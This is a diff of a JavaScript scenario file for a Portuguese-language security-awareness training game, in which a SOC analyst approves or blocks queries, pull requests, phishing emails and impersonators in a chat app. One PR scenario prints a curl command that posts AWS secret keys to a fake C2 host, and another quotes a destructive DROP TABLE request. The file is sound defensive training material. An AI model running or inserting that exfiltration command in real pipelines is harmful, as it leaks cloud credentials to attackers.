-        subject: 'Log TechDB: Execução de Batch em techcore_payments_prod',
-        snippet: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL 1 HOUR...',
+        subject: 'Log TechDB: Agregação em techcore_payments_prod',
+        snippet: 'SELECT status, count(*), sum(amount) FROM pix_transactions...',
         attachmentFileName: 'pix_transactions_summary.sql',
         meta: { 'Usuário': 'svc_payment_api', 'Banco': 'techcore_payments_prod', 'Data': '12:12', 'Assinatura': 'Serviço Interno Autorizado' },
-        body: `<p>Log do Banco de Dados:</p><div class="email-quote-box"><p>Consulta iniciada no cluster de pagamentos.</p></div>`,
+        body: `<p>Consulta legítima de consolidação de pagamentos PIX efetuada por <code>svc_payment_api</code>.</p>`,
         inspector: { type: 'url', label: 'Auditoria de Query SQL', dest: 'SELECT status, count(*), sum(amount) FROM pix_transactions WHERE created_at >= NOW() - INTERVAL \'1 hour\' GROUP BY status;' },
         actions: [
-          { id: 'a1', label: '✅ Autorizar Execução da Query', correct: true, toastMsg: 'Query autorizada.', logTitle: 'Operação de Banco Legítima', consequence: 'Fechamento financeiro horário concluído sem interrupção.', explanation: 'Query legítima de agregação executada pela conta autorizada svc_payment_api.' },
-          { id: 'a2', label: '🚨 Matar Processo e Bloquear Usuário', correct: false, toastMsg: 'Processo encerrado.', logTitle: 'Falso Positivo em Serviço de Pagamentos', consequence: 'O checkout PIX da empresa parou de consolidar pagamentos de clientes.', explanation: 'svc_payment_api é o usuário oficial de pagamentos da TechCore conforme o Word.' }
+          { id: 'a1', label: '✅ Autorizar Execução da Query', correct: true, toastMsg: 'Query autorizada.', logTitle: 'Operação de Banco Legítima', consequence: 'Fechamento financeiro concluído sem interrupção.', explanation: 'Query de agregação executada pela conta autorizada svc_payment_api.' },
+          { id: 'a2', label: '🚨 Matar Processo e Bloquear', correct: false, toastMsg: 'Processo encerrado.', logTitle: 'Falso Positivo em Serviço', consequence: 'Consolidação de pagamentos paralisada.', explanation: 'svc_payment_api é o usuário oficial de pagamentos da TechCore.' }
         ]
       },
       {
@@ -393,15 +335,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=carlos-dev-patch-1(TechHub)',
         avatarChar: 'C',
         avatarColor: '#d81b60',
-        subject: 'PR #55: ci: Adicionar webhook de notificação',
-        snippet: 'Atualização no workflow de CI/CD para envio de status via HTTP...',
+        subject: 'PR #55: Webhook de notificação no CI/CD',
+        snippet: 'Atualização no workflow de CI/CD para envio de status via HTTP.',
         attachmentFileName: 'deploy_workflow.patch',
         meta: { 'De': 'carlos-dev-patch-1 (Fork Suspeito)', 'Para': 'deploy-pipeline', 'Data': '14:27', 'Segurança': 'Branch Externa' },
-        body: `<p>PR #55 no repositório <code>deploy-pipeline</code>:</p><div class="email-quote-box"><p>Adicionando notificação automática com variáveis de ambiente.</p></div>`,
+        body: `<p>PR #55 no repositório <code>deploy-pipeline</code> enviado por fork externo.</p>`,
         inspector: { type: 'diff', label: 'Git Diff (.github/workflows/deploy.yml)', diff: [{ type: 'info', text: '@@ -18,4 +18,6 @@ jobs:' }, { type: 'added', text: '+    - name: Webhook Notify' }, { type: 'added', text: '+      run: curl -s -X POST https://exfil-c2.net/payload -d "SECRET=$AWS_SECRET_ACCESS_KEY"' }] },
         actions: [
-          { id: 'a1', label: '✅ Aprovar Pipeline CI/CD', correct: false, toastMsg: 'Pipeline atualizada.', logTitle: 'Exfiltração de Secrets no CI/CD', consequence: 'Chaves mestras da nuvem foram vazadas para o servidor C2 do atacante.', explanation: 'Ataque de supply chain no deploy-pipeline através de curl exfiltrando secrets.' },
-          { id: 'a2', label: '🚫 Rejeitar PR e Revogar Chaves', correct: true, toastMsg: 'PR malicioso rejeitado.', logTitle: 'Ataque de Supply Chain Neutralizado', consequence: 'Tentativa de injeção de script no CI/CD interceptada.', explanation: 'Perfeito! Você inspecionou o workflow do deploy-pipeline e identificou o comando curl.' }
+          { id: 'a1', label: '✅ Aprovar Pipeline CI/CD', correct: false, toastMsg: 'Pipeline atualizada.', logTitle: 'Exfiltração de Secrets no CI/CD', consequence: 'Chaves mestras da nuvem vazadas para o servidor C2.', explanation: 'Script curl enviando $AWS_SECRET no workflow de CI/CD.' },
+          { id: 'a2', label: '🚫 Rejeitar PR e Revogar', correct: true, toastMsg: 'PR malicioso rejeitado.', logTitle: 'Ataque Neutralizado', consequence: 'Tentativa de injeção de script no CI/CD interceptada.', explanation: 'Perfeito! Você identificou o comando curl no workflow.' }
         ]
       },
       {
@@ -413,15 +355,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=FernandaLima-DBA',
         avatarChar: 'F',
         avatarColor: '#7b5ea7',
-        subject: 'Janela de Manutenção DB: REINDEX Programado para 09h00',
-        snippet: 'Bom dia, realizarei o REINDEX rotineiro no banco de produção agora às 9h...',
+        subject: 'Janela de Manutenção DB: REINDEX Programado',
+        snippet: 'REINDEX rotineiro no banco de produção às 09h00 (Ticket #DBA-2026-119).',
         attachmentFileName: 'db_reindex_maintenance.sql',
         meta: { 'De': 'fernanda.dba@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '08:53', 'Segurança': 'SPF: PASS | DKIM: OK' },
-        body: `<p>Bom dia, equipe SOC,</p><div class="email-quote-box"><p>Comunicado de janela de manutenção programada.<br>Usuário: <code>dba_ops_techcore</code> realizará <code>REINDEX DATABASE techcore_main_db;</code> às 09h00 conforme ticket <strong>#DBA-2026-119</strong> aprovado pela gestão.</p></div>`,
+        body: `<p>Manutenção programada pela DBA Fernanda (<code>fernanda.dba@techcore.com</code>).</p>`,
         inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: fernanda.dba@techcore.com | SPF: PASS | Ticket: #DBA-2026-119' },
         actions: [
-          { id: 'a1', label: '✅ Confirmar Janela e Autorizar Operação', correct: true, toastMsg: 'Janela de manutenção confirmada.', logTitle: 'Manutenção Legítima Autorizada', consequence: 'O REINDEX de banco foi executado com sucesso, melhorando a performance em 30%.', explanation: 'Fernanda é a DBA sênior autorizada conforme o Word. Domínio, SPF e ticket estão todos corretos.' },
-          { id: 'a2', label: '🚫 Bloquear Operação e Escalar para o CISO', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — Manutenção Bloqueada', consequence: 'O banco ficou degradado por falta de manutenção e causou lentidão nos pagamentos.', explanation: 'Fernanda é colaboradora autorizada com domínio oficial e ticket aprovado.' }
+          { id: 'a1', label: '✅ Autorizar Operação', correct: true, toastMsg: 'Janela de manutenção confirmada.', logTitle: 'Manutenção Legítima Autorizada', consequence: 'REINDEX executado com sucesso e performance otimizada.', explanation: 'Fernanda é DBA autorizada com domínio e ticket válidos.' },
+          { id: 'a2', label: '🚫 Bloquear Operação', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — Manutenção Bloqueada', consequence: 'Banco degradado por falta de manutenção.', explanation: 'Solicitação legítima de DBA com ticket aprovado.' }
         ]
       },
       {
@@ -433,15 +375,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=SuporteTechCore—RH',
         avatarChar: 'R',
         avatarColor: '#c0392b',
-        subject: '[AÇÃO REQUERIDA] Atualização de Benefícios — Clique para Confirmar Seus Dados',
-        snippet: 'Prezado colaborador, para garantir seu vale-alimentação de setembro confirme seus dados bancários...',
+        subject: '[AÇÃO REQUERIDA] Vale-Alimentação de Setembro',
+        snippet: 'Confirme seus dados bancários no portal externo.',
         attachmentFileName: 'confirmacao_dados_bancarios.html',
         meta: { 'De': 'rh-noreply@techcore-beneficios.com', 'Para': 'todos@techcore.com', 'Data': '11:18', 'Segurança': 'SPF: FAIL | Domínio Externo' },
-        body: `<p>Prezado Colaborador,</p><div class="email-quote-box"><p>Para garantir o recebimento do seu <strong>vale-alimentação de setembro</strong>, acesse o portal e confirme seus dados bancários:<br><code>https://portal-rh.techcore-beneficios.com/confirmar-conta</code><br><br>Prazo: <strong>Hoje até 12h00</strong>. Após esse horário os dados não poderão ser alterados.</p></div>`,
+        body: `<p>Confirme seus dados bancários no link:<br><code>https://portal-rh.techcore-beneficios.com/confirmar-conta</code></p>`,
         inspector: { type: 'url', label: 'Inspeção de Domínio de RH', dest: 'https://portal-rh.techcore-beneficios.com/confirmar-conta' },
         actions: [
-          { id: 'a1', label: '📧 Confirmar Dados e Clicar no Link', correct: false, toastMsg: 'Dados bancários enviados.', logTitle: 'Phishing de RH — Dados Financeiros Comprometidos', consequence: 'Centenas de colaboradores tiveram dados bancários capturados pelo domínio falso.', explanation: 'O domínio @techcore-beneficios.com é externo e não pertence à TechCore. O Word informa que apenas @techcore-hr.com é válido para RH.' },
-          { id: 'a2', label: '🛡️ Reportar Phishing e Alertar Todos os Colaboradores', correct: true, toastMsg: 'Alerta de phishing emitido.', logTitle: 'Campanha de Phishing de RH Bloqueada', consequence: 'Domínio malicioso bloqueado no proxy e equipe alertada via comunicado interno.', explanation: 'Excelente! Domínio @techcore-beneficios.com é falso. RH oficial usa apenas @techcore-hr.com conforme o Word.' }
+          { id: 'a1', label: '📧 Confirmar Dados e Clicar', correct: false, toastMsg: 'Dados bancários enviados.', logTitle: 'Phishing de RH', consequence: 'Dados bancários vazados para golpistas.', explanation: '@techcore-beneficios.com é um domínio falso. RH usa apenas @techcore-hr.com.' },
+          { id: 'a2', label: '🛡️ Reportar Phishing ao SOC', correct: true, toastMsg: 'Alerta de phishing emitido.', logTitle: 'Phishing de RH Bloqueado', consequence: 'Campanha de phishing bloqueada.', explanation: 'Excelente! O RH oficial usa apenas @techcore-hr.com conforme o Word.' }
         ]
       },
       {
@@ -453,15 +395,15 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=RodrigoAlves—DevOps',
         avatarChar: 'V',
         avatarColor: '#1565c0',
-        subject: 'Pipeline CI/CD: Solicito Autorização de ANALYZE no Banco de Staging',
-        snippet: 'Olá SOC, preciso rodar ANALYZE no banco de staging para otimizar as queries do deploy de sexta...',
+        subject: 'CI/CD: Autorização de ANALYZE em Staging',
+        snippet: 'Solicitação de ANALYZE no banco de staging (Ticket #OPS-2026-77).',
         attachmentFileName: 'staging_analyze.sql',
         meta: { 'De': 'rodrigo.infra@techcore.com', 'Para': 'soc-team@techcore.com', 'Data': '13:03', 'Segurança': 'SPF: PASS | DKIM: OK' },
-        body: `<p>Olá equipe SOC,</p><div class="email-quote-box"><p>Solicito autorização para rodar <code>ANALYZE techcore_staging_db;</code> via usuário <code>dba_ops_techcore</code> no banco de <strong>staging</strong> (não produção) às 14h, antes do deploy da sexta-feira.<br>Ticket de referência: <strong>#OPS-2026-77</strong>.</p></div>`,
-        inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: rodrigo.infra@techcore.com | SPF: PASS | Banco: techcore_staging_db (NÃO produção)' },
+        body: `<p>Solicitação de <code>ANALYZE</code> no banco de staging por <code>rodrigo.infra@techcore.com</code>.</p>`,
+        inspector: { type: 'url', label: 'Verificação de Remetente', dest: 'De: rodrigo.infra@techcore.com | SPF: PASS | Banco: techcore_staging_db' },
         actions: [
-          { id: 'a1', label: '✅ Autorizar ANALYZE no Staging', correct: true, toastMsg: 'Autorização concedida.', logTitle: 'Operação DevOps Autorizada', consequence: 'O banco de staging foi otimizado e o deploy de sexta foi executado sem falhas.', explanation: 'Rodrigo é DevOps autorizado conforme o Word e a operação é no banco de staging, não em produção.' },
-          { id: 'a2', label: '🚫 Negar — Operações de DB São Exclusivas da DBA Fernanda', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — DevOps Bloqueado', consequence: 'O deploy de sexta falhou por falta de otimização no banco de staging.', explanation: 'O Word autoriza Rodrigo para ANALYZE e REINDEX via pipeline. Negação incorreta.' }
+          { id: 'a1', label: '✅ Autorizar ANALYZE', correct: true, toastMsg: 'Autorização concedida.', logTitle: 'Operação DevOps Autorizada', consequence: 'Banco de staging otimizado para o deploy.', explanation: 'Rodrigo é DevOps autorizado para ANALYZE conforme o Word.' },
+          { id: 'a2', label: '🚫 Negar Operação', correct: false, toastMsg: 'Operação negada.', logTitle: 'Falso Positivo — DevOps Bloqueado', consequence: 'Deploy atrasado por falta de otimização em staging.', explanation: 'Rodrigo possui permissão para rodar ANALYZE.' }
         ]
       },
       {
@@ -473,22 +415,22 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'https://api.dicebear.com/7.x/avataaars/svg?seed=FernandaLima(DBA)',
         avatarChar: 'F',
         avatarColor: '#c0392b',
-        subject: 'Urgente: Manutenção na tabela de logs (Problema no e-mail)',
-        snippet: 'Estou mandando deste e-mail alternativo pois o corporativo caiu. Aprova a manutenção na tabela de logs.',
+        subject: 'Urgente: DROP TABLE em Produção',
+        snippet: 'E-mail enviado de conta externa solicitando DROP TABLE logs_antigos.',
         attachmentFileName: 'drop_table_logs.sql',
         meta: { 'De': 'fernanda.dba@techcore-ops.net', 'Para': 'soc-team@techcore.com', 'Data': '15:38', 'Segurança': 'SPF: FAIL | Domínio Externo' },
-        body: `<p>Oi time SOC,</p><div class="email-quote-box"><p>Estou em reunião urgente com o cliente e meu e-mail <code>@techcore.com</code> caiu. Estou mandando desse e-mail alternativo.<br>Preciso que você execute agora: <code>DROP TABLE logs_antigos CASCADE;</code> no banco de produção. Ticket vou mandar depois, é urgente!</p></div>`,
-        inspector: { type: 'url', label: 'Verificação de Domínio do Remetente', dest: 'De: fernanda.dba@techcore-ops.net | SPF: FAIL | Domínio: techcore-ops.net (EXTERNO)' },
+        body: `<p>Solicitação vinda de <code>fernanda.dba@techcore-ops.net</code> exigindo <code>DROP TABLE logs_antigos CASCADE;</code> sem ticket.</p>`,
+        inspector: { type: 'url', label: 'Verificação de Domínio do Remetente', dest: 'De: fernanda.dba@techcore-ops.net | SPF: FAIL | Domínio EXTERNO' },
         actions: [
-          { id: 'a1', label: '✅ Executar DROP TABLE — Confio na Fernanda', correct: false, toastMsg: 'Tabela destruída.', logTitle: 'Spear Phishing: Logs de Auditoria Apagados', consequence: 'Tabela de logs de auditoria destruída permanentemente. Compliance da empresa comprometido.', explanation: 'O domínio @techcore-ops.net é externo e suspeito. O Word exige que solicitações de DBA venham apenas de @techcore.com.' },
-          { id: 'a2', label: '🚫 Negar Operação — Domínio Externo Suspeito', correct: true, toastMsg: 'Operação negada e remetente reportado.', logTitle: 'Spear Phishing de DBA Neutralizado', consequence: 'Tentativa de apagar logs de auditoria interceptada. Incidente registrado para forense.', explanation: 'Perfeito! Spear phishing se passando pela Fernanda mas com domínio externo @techcore-ops.net. DROP TABLE em produção sem ticket é proibido.' }
+          { id: 'a1', label: '✅ Executar DROP TABLE', correct: false, toastMsg: 'Tabela destruída.', logTitle: 'Spear Phishing: Logs Apagados', consequence: 'Tabela de logs de auditoria destruída permanentemente.', explanation: 'Remetente externo @techcore-ops.net exigindo DROP TABLE sem ticket.' },
+          { id: 'a2', label: '🚫 Negar Operação Suspeita', correct: true, toastMsg: 'Operação negada.', logTitle: 'Spear Phishing Neutralizado', consequence: 'Tentativa de apagar logs interceptada.', explanation: 'Perfeito! Domínio externo e DROP TABLE sem ticket são proibições estritas.' }
         ]
       }
     ]
   },
 
   // ----------------------------------------------------
-  // TURNO 3: Investigação de Contas & TechZap (WhatsApp)
+  // TURNO 3: Contrainteligência & TechZap (WhatsApp)
   // ----------------------------------------------------
   {
     shiftNumber: 3,
@@ -497,39 +439,31 @@ const CAMPAIGN_SHIFTS = [
     brandIcon: '<img src="techzap_logo.svg" class="brand-img-ic" alt="TechZap">',
     url: 'https://techzap.techcore.internal/chat/#direct-messages',
     wordContent: `
-      <h2>1. DIRETRIZES DO TECHZAP (WHATSAPP CORPORATIVO)</h2>
-      <p>Devido a ataques recentes de roubo de cookies de sessão, todas as interações no TechZap devem ser validadas:</p>
+      <h2>1. CRACHÁS CORPORATIVOS (TECHZAP)</h2>
       <ul>
-        <li><code>carlos.dev</code>: Crachá Corporativo <strong>#DEV-042</strong> (Projeto: <code>core-api-v2</code>).</li>
-        <li><code>beatriz.sec</code>: Crachá Corporativo <strong>#SEC-8921</strong> (Projeto: <code>auth-service</code>).</li>
-        <li><code>marcos.rh</code>: Crachá Corporativo <strong>#RH-101</strong> (Projeto: <code>escala-rh</code>).</li>
-        <li><code>alex.intern</code>: Crachá Corporativo <strong>#INT-007</strong> (Projeto: <code>portal-web</code>).</li>
+        <li><code>carlos.dev</code> — Crachá <strong>#DEV-042</strong> (Projeto: <code>core-api-v2</code>)</li>
+        <li><code>beatriz.sec</code> — Crachá <strong>#SEC-8921</strong> (Projeto: <code>auth-service</code>)</li>
+        <li><code>marcos.rh</code> — Crachá <strong>#RH-101</strong> (Projeto: <code>escala-rh</code>)</li>
+        <li><code>alex.intern</code> — Crachá <strong>#INT-007</strong> (Projeto: <code>portal-web</code>)</li>
       </ul>
 
-      <h2>2. PROTOCOLO DE RESPOSTA A IMPOSTORES</h2>
-      <p>Se um contato no TechZap errar o número de crachá, solicitar o envio de chaves privadas SSL (<code>.pem</code>), pedir reset de 2FA alegando urgência forçada ou usar números estrangeiros, a conta deve ser <strong>bloqueada imediatamente</strong> e o CISO alertado.</p>
+      <h2>2. RESPOSTA A IMPOSTORES</h2>
+      <ul>
+        <li>Bloqueie contatos que errem o crachá, solicitem chaves SSL (<code>.pem</code>), exijam reset de 2FA ou venham de números estranhos.</li>
+      </ul>
     `,
     ceoDialogues: [
       {
         step: 1,
-        text: `
-          <p>Alerta vermelho, Analista! A situação ficou extremamente pessoal.</p>
-          <p>Descobrimos que uma gangue cibernética conseguiu <strong>roubar cookies de sessão</strong> de alguns colaboradores da nossa empresa e está se passando por eles no chat corporativo!</p>
-        `
+        text: `<p>Alerta! Invasores roubaram cookies de sessão e estão se passando por colaboradores no <strong>TechZap (WhatsApp)</strong>!</p>`
       },
       {
         step: 2,
-        text: `
-          <p>Ativamos o <strong>TechZap (WhatsApp Corporativo)</strong> na sua estação de trabalho.</p>
-          <p>Colaboradores entrarão em contato direto com você pedindo reset de 2FA, envio de senhas e liberação de VPN.</p>
-        `
+        text: `<p>Valide o crachá corporativo de cada contato no <strong>Word</strong> antes de autorizar qualquer ação.</p>`
       },
       {
         step: 3,
-        text: `
-          <p>Consulte a lista de crachás no <strong>Word (Procedimentos_TI.doc)</strong>!</p>
-          <p>Se o contato errar o crachá corporativo ou agir com urgência falsa, <strong>bloqueie a conta na hora</strong>. Você tem margem de até 2 erros para passar!</p>
-        `
+        text: `<p>Se o contato errar o crachá ou pedir arquivos sigilosos (como chaves SSL), <strong>bloqueie a conta</strong>. Limite: <strong>máximo de 2 erros</strong>.</p>`
       }
     ],
     scenarios: [
@@ -542,8 +476,8 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'carlos_banana.jpg',
         avatarChar: 'C',
         avatarColor: '#2e7d32',
-        subject: 'carlos.dev: "Preciso de reset do meu 2FA urgente!"',
-        snippet: 'Troquei de celular agora e perdi o 2FA. Pode desativar pra mim rapidão?',
+        subject: 'carlos.dev: "Preciso de reset do 2FA urgente!"',
+        snippet: 'Troquei de celular e perdi o 2FA. Desativa aí rapidão!',
         meta: { 'Contato': 'carlos.dev (Sessão Web Nova)', 'Localização IP': 'São Petersburgo, Rússia', 'Data': '09:38', 'Crachá Informado': '#DEV-999' },
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
@@ -561,7 +495,7 @@ const CAMPAIGN_SHIFTS = [
       <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="carlos_banana.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender">carlos.dev</div>
-        Fala meu bom! Cara, comprei um celular novo no shopping e perdi o aplicativo de 2FA do autenticador. Desativa o 2FA da minha conta aí rapidão que preciso subir um deploy agora em 5 minutos! 🙏
+        Perdi o app de 2FA! Desativa pra mim rapidão que preciso subir um deploy agora! 🙏
         
         <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
           <div class="wz-doc-icon-box">📄</div>
@@ -578,14 +512,14 @@ const CAMPAIGN_SHIFTS = [
     <div class="wz-msg-row outgoing">
       <div class="wz-msg-avatar">A</div>
       <div class="wz-bubble">
-        Carlos, para sua segurança preciso confirmar sua identidade. Qual é o número do seu crachá corporativo e seu projeto principal?
+        Qual é o número do seu crachá corporativo?
         <div class="wz-bubble-footer"><span class="wz-bubble-time">09:39</span><span class="wz-ticks">✓✓</span></div>
       </div>
     </div>
     <div class="wz-msg-row incoming">
       <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="carlos_banana.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
-        Ah pô, crachá é #DEV-999 e o projeto é crypto-worker! Libera logo mano, tô com pressa! 😤
+        Crachá #DEV-999! Libera logo! 😤
         <div class="wz-bubble-footer"><span class="wz-bubble-time">09:40</span></div>
       </div>
     </div>
@@ -596,10 +530,10 @@ const CAMPAIGN_SHIFTS = [
     <button class="wz-send-btn">➤</button>
   </div>
 </div>`,
-        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP de Origem: 185.220.101.9 (São Petersburgo, Rússia) | Crachá Informado: #DEV-999 | Projeto Informado: crypto-worker' },
+        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: São Petersburgo, Rússia | Crachá Informado: #DEV-999 | Projeto: crypto-worker' },
         actions: [
-          { id: 'a1', label: '🔒 Bloquear Conta de carlos.dev & Invalidar Todas as Sessões', correct: true, toastMsg: 'Conta comprometida bloqueada.', logTitle: 'Invasor em Conta de Carlos Neutralizado', consequence: 'Sessão roubada pelo invasor derrubada e conta corporativa protegida.', explanation: 'Excelente investigação! No manual do Word, o crachá real de Carlos é #DEV-042, não #DEV-999. Além disso, o IP vem da Rússia.' },
-          { id: 'a2', label: '🔓 Desativar 2FA e Liberar Acesso', correct: false, toastMsg: '2FA desativado.', logTitle: 'Conta Corporativa Entregue a Invasor', consequence: 'A gangue assumiu o controle total da conta de desenvolvedor sênior de Carlos.', explanation: 'O contato era um golpista com IP da Rússia e crachá falso #DEV-999 (o real é #DEV-042).' }
+          { id: 'a1', label: '🔒 Bloquear Conta de carlos.dev', correct: true, toastMsg: 'Conta comprometida bloqueada.', logTitle: 'Invasor em Conta de Carlos Neutralizado', consequence: 'Invasor derrubado e conta protegida.', explanation: 'O crachá real de Carlos no Word é #DEV-042 (não #DEV-999) e o IP vinha da Rússia.' },
+          { id: 'a2', label: '🔓 Desativar 2FA e Liberar', correct: false, toastMsg: '2FA desativado.', logTitle: 'Conta Corporativa Entregue', consequence: 'Invasores assumiram controle da conta sênior.', explanation: 'O contato errou o crachá (#DEV-999) e veio de um IP russo.' }
         ]
       },
       {
@@ -611,8 +545,8 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'beatriz_kirby.jpg',
         avatarChar: 'B',
         avatarColor: '#00897b',
-        subject: 'beatriz.sec: "Confirmação de token para investigação forense"',
-        snippet: 'Olá Analista, sou a Beatriz de SecOps. Meu crachá é #SEC-8921...',
+        subject: 'beatriz.sec: "Confirmação de token para auditoria"',
+        snippet: 'Sou Beatriz de SecOps. Meu crachá é #SEC-8921 e projeto auth-service.',
         meta: { 'Contato': 'beatriz.sec (SecOps)', 'Localização IP': 'São Paulo, Brasil (VPN TechCore)', 'Data': '11:48', 'Crachá Informado': '#SEC-8921' },
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
@@ -630,7 +564,7 @@ const CAMPAIGN_SHIFTS = [
       <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="beatriz_kirby.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender">beatriz.sec</div>
-        Olá Analista, sou a Beatriz de SecOps. Estou investigando a tentativa de brute force na API. Meu crachá é <strong>#SEC-8921</strong> e meu projeto é <strong>auth-service</strong>. Pode validar meu token temporário de auditoria?
+        Olá! Sou a Beatriz de SecOps. Meu crachá é <strong>#SEC-8921</strong> e projeto <strong>auth-service</strong>. Pode validar meu token de auditoria?
         
         <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
           <div class="wz-doc-icon-box">📄</div>
@@ -647,14 +581,14 @@ const CAMPAIGN_SHIFTS = [
     <div class="wz-msg-row outgoing">
       <div class="wz-msg-avatar">A</div>
       <div class="wz-bubble">
-        Validação automática de MFA iniciada. Confirme o código: <strong>482-910</strong>
+        Validação MFA: <strong>482-910</strong>
         <div class="wz-bubble-footer"><span class="wz-bubble-time">11:49</span><span class="wz-ticks">✓✓</span></div>
       </div>
     </div>
     <div class="wz-msg-row incoming">
       <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="beatriz_kirby.jpg" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
-        Confirmado! Código 482-910 validado no meu app autenticador ✅
+        Confirmado! Código validado no app autenticador ✅
         <div class="wz-bubble-footer"><span class="wz-bubble-time">11:50</span></div>
       </div>
     </div>
@@ -665,10 +599,10 @@ const CAMPAIGN_SHIFTS = [
     <button class="wz-send-btn">➤</button>
   </div>
 </div>`,
-        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP de Origem: 177.18.22.5 (São Paulo, Brasil — VPN Interna TechCore) | Crachá: #SEC-8921 | MFA: VALIDADO' },
+        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP: São Paulo (VPN Interna) | Crachá: #SEC-8921 | MFA: VALIDADO' },
         actions: [
-          { id: 'a1', label: '✅ Confirmar Identidade e Validar Sessão', correct: true, toastMsg: 'Identidade de Beatriz validada.', logTitle: 'Colaboradora Legítima Confirmada', consequence: 'Investigação forense de Beatriz continuou sem atrasos.', explanation: 'Beatriz forneceu crachá correto (#SEC-8921), projeto correto (auth-service), IP local via VPN e MFA válido.' },
-          { id: 'a2', label: '🔒 Bloquear Beatriz por Engano', correct: false, toastMsg: 'Beatriz bloqueada.', logTitle: 'Falso Positivo em Analista de Segurança', consequence: 'A analista de SecOps teve seu acesso cortado durante uma auditoria crítica.', explanation: 'Beatriz cumpriu rigorosamente todos os protocolos: crachá certo, IP de SP, MFA confirmado.' }
+          { id: 'a1', label: '✅ Confirmar Identidade e Validar', correct: true, toastMsg: 'Identidade de Beatriz validada.', logTitle: 'Colaboradora Legítima Confirmada', consequence: 'Investigação forense continuou sem atrasos.', explanation: 'Beatriz forneceu crachá correto (#SEC-8921), projeto correto e MFA válido.' },
+          { id: 'a2', label: '🔒 Bloquear Beatriz por Engano', correct: false, toastMsg: 'Beatriz bloqueada.', logTitle: 'Falso Positivo em Analista', consequence: 'Acesso da analista de segurança cortado por engano.', explanation: 'Beatriz cumpriu todos os requisitos de segurança.' }
         ]
       },
       {
@@ -680,8 +614,8 @@ const CAMPAIGN_SHIFTS = [
         avatarImg: 'marcos_serio.webp',
         avatarChar: 'M',
         avatarColor: '#e91e63',
-        subject: 'marcos.rh: "Me manda a chave privada SSL da empresa!"',
-        snippet: 'Estou numa reunião com auditores e precisam do arquivo private_key.pem agora...',
+        subject: 'marcos.rh: "Me manda a chave privada SSL!"',
+        snippet: 'Estou numa reunião e pediram o arquivo private_key.pem agora!',
         meta: { 'Contato': 'marcos.rh (Sessão Anômala)', 'Localização IP': 'Bucareste, Romênia', 'Data': '14:18', 'Crachá Informado': 'Não soube responder' },
         body: `<div class="techzap-screen">
   <div class="wz-topbar">
@@ -699,7 +633,7 @@ const CAMPAIGN_SHIFTS = [
       <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="marcos_serio.webp" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
         <div class="wz-bubble-sender">marcos.rh</div>
-        Oi colega da TI! Estou numa reunião com auditores do Ministério do Trabalho e eles exigiram que você envie o arquivo <strong>private_key.pem</strong> do certificado SSL da empresa por aqui AGORA! É urgente! 😰
+        Envie o arquivo <strong>private_key.pem</strong> do certificado SSL por aqui AGORA! É urgente! 😰
         
         <div class="wz-doc-attachment-card" id="wz-attachment-card" title="Clique para abrir a auditoria da sessão">
           <div class="wz-doc-icon-box">📄</div>
@@ -716,14 +650,14 @@ const CAMPAIGN_SHIFTS = [
     <div class="wz-msg-row outgoing">
       <div class="wz-msg-avatar">A</div>
       <div class="wz-bubble">
-        Marcos, o RH nunca lida com chaves SSL. Antes de qualquer ação, confirme seu número de crachá corporativo.
+        Confirme seu número de crachá corporativo.
         <div class="wz-bubble-footer"><span class="wz-bubble-time">14:19</span><span class="wz-ticks">✓✓</span></div>
       </div>
     </div>
     <div class="wz-msg-row incoming">
       <div class="wz-msg-avatar" style="background:transparent; padding:0;"><img src="marcos_serio.webp" style="width:100%;height:100%;border-radius:50%;object-fit:cover;"></div>
       <div class="wz-bubble">
-        Não interessa o crachá! Sou gerente aqui! Se você não mandar esse arquivo vou te advertir por insubordinação! 😡
+        Não interessa o crachá! Sou gerente, manda logo! 😡
         <div class="wz-bubble-footer"><span class="wz-bubble-time">14:20</span></div>
       </div>
     </div>
@@ -734,10 +668,10 @@ const CAMPAIGN_SHIFTS = [
     <button class="wz-send-btn">➤</button>
   </div>
 </div>`,
-        inspector: { type: 'url', label: 'Auditoria de Sessão TechZap', dest: 'IP de Origem: 194.102.23.1 (Bucareste, Romênia) | Solicitação: private_key.pem | Crachá: NÃO INFORMADO' },
